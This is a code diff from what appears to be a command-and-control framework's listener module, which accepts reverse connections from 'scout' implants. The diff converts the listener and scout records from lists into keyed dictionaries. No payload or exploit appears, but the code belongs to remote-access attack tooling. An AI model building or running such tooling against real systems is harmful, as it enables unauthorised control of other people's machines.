@@ -14,8 +14,9 @@ def main(self, host, port, name, reply):
         s.listen(1)
         s.settimeout(2)
         local_copy_of_id = self.config.incremented_listener_id
-        self.config.listener_database[str(self.config.incremented_listener_id)] = [host, str(port), name,
-                                                                         datetime.now().strftime('%Y-%m-%d %H:%M:%S'), []]
+        # self.config.listener_database[str(self.config.incremented_listener_id)] = [host, str(port), name,
+                                                                         # datetime.now().strftime('%Y-%m-%d %H:%M:%S'), []]
+        self.config.listener_database[str(self.config.incremented_listener_id)] = {"host": host, "port": str(port), "name": name, "created_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "connections": []}
         self.config.incremented_listener_id += 1
         self.log.pos('Successfully started listener thread at : ' + host + ':' + str(port))
         self.config.change = True
@@ -49,13 +50,14 @@ def main(self, host, port, name, reply):
                             self.log.blank("\n")
                             self.log.pos('Connection received from scout : ' + addr[0] + ':' + str(addr[1]) + ' -> ' + host + ':' + str(port))
                             self.config.thread_message = ['pos', 'Connection received from scout : ' + addr[0] + ':' + str(addr[1]) + ' -> ' + host + ':' + str(port)]
-                            self.config.scout_database[str(self.config.incremented_scout_id)] = [conn, addr[0], str(addr[1]),
-                                                                                       host + ':' + str(port),
-                                                                                       return_random_string.main(5),
-                                                                                       datetime.now().strftime(
-                                                                                           '%Y-%m-%d %H:%M:%S'),
-                                                                                       'Reverse']
-                            self.config.listener_database[str(local_copy_of_id)][4].append(addr[0] + ':' + str(addr[1]))
+                            # self.config.scout_database[str(self.config.incremented_scout_id)] = [0conn, 1addr[0], 2str(addr[1]),
+                            #                                                            3host + ':' + str(port),
+                            #                                                            4return_random_string.main(5),
+                            #                                                            5datetime.now().strftime(
+                            #                                                                '%Y-%m-%d %H:%M:%S'),
+                            #                                                            6'Reverse']
+                            self.config.scout_database[str(self.config.incremented_scout_id)] = {"conn_object": conn, "host": addr[0], "port": str(addr[1]), "connection_through": host + ':' + str(port), "name": return_random_string.main(5), "connected_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "connection_type": "Reverse"}
+                            self.config.listener_database[str(local_copy_of_id)]["connections"].append(addr[0] + ':' + str(addr[1]))
                             self.config.incremented_scout_id += 1
                             self.config.change = True
                         else:
